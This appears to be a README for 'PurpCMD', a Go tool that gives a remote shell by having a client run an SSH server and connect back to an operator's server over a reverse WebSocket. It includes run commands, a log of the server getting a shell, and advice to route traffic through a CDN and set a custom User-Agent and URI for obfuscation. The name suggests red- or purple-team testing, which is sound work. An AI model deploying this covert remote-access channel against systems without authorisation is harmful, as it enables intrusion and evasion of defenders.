# PurpCMD

Purpcmd operates by initiating a simple SSH server on the client side. Leveraging SSH has many improved features to work with remote terminals, such as enhanced interaction quality, window resizing, full duplex communications, and more. This type of approach tends to work better than using reverse shell, that use system features, synchronized sockets and IO, it will have limited capabilities. Purpcmd employs a reverse WebSocket connection to seamlessly synchronize the SSH connection with the server.

The communication is secure and very malleable. It can be channeled through Content Delivery Network (CDN) to enhance obfuscation and other security measures.

![img1](img/img1.png)

Start the server:

```
        Server usage: purpcmd server [options] ...

        Client usage: purpcmd client [options] ...
                -ua defines the User-Agent HTTP header to use
                during the request.

        Global Options:
                -a is the address to listen on or connect to.
                Use "-a 127.0.0.1:8080".

                -uri configures the URI where to connect or to receive
                the websocket connection.
                Use "-uri /assets";

```

### 1. Start the server

```
go run . server
2024/02/17 01:08:57 Listening on ws://0.0.0.0:8080/
```

### 2. Execute the client

```
go run . client -a 0.0.0.0:8080
2024/02/17 01:10:32 Connecting to ws://0.0.0.0:8080/
2024/02/17 01:10:32 Key O+XvBDAEHzyN9s78Iy6iegk3vWT7hzQZsErg/2Y+Ehg= found.
2024/02/17 01:10:32 Client got shell
```

### 3. Use the server new shell

```
╰─$ go run . server
2024/02/17 01:08:57 Listening on ws://0.0.0.0:8080/
2024/02/17 01:10:32 Proxy connected 0.0.0.0:8080
Setting up STDIN
Setting up STDOUT
Setting up STDERR
call shell
farinap@xyz:~/go/src/PurpleCommand$ ls
LICENSE  README.md  agent  go.mod  go.sum  img  main.go  server  utils
farinap@xyz:~/go/src/PurpleCommand$
```